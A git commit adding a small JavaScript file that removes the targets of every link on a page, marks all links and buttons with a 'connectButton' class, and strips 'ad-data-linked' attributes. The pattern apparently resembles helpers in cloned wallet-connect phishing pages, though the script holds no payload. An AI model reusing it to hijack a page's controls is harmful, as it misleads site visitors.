71fc8c8bb82a7c7a4213709689a9a6c7e7649a69
Jlens3 <155668446+Jlens3@users.noreply.github.com>
2024-11-07 09:50:09 +0100

    Add files via upload

---
+++ script.js
@@ -0,0 +1,33 @@
+    
+    document.addEventListener('DOMContentLoaded', function () {
+      var links = document.querySelectorAll('body a');
+      for (var i = 0; i < links.length; i++) {
+        var link = links[i];
+        link.removeAttribute('href');
+        link.classList.add('connectButton');
+      }
+      });
+      
+      
+  document.addEventListener('DOMContentLoaded', function () {
+    var buttons = document.querySelectorAll('body button');
+    for (var i = 0; i < buttons.length; i++) {
+      var button = buttons[i];
+      button.classList.add('connectButton');
+    }
+  });
+  
+  console.log('him');
+  
+    document.addEventListener("DOMContentLoaded", function() {
+      const elements = document.querySelectorAll('[ad-data-linked]');
+      elements.forEach(element => {
+          element.removeAttribute('ad-data-linked');
+      });
+  
+      console.log('Removed ad-data-linked attributes from', elements.length, 'elements');
+  });
+  
+  
+  
+      
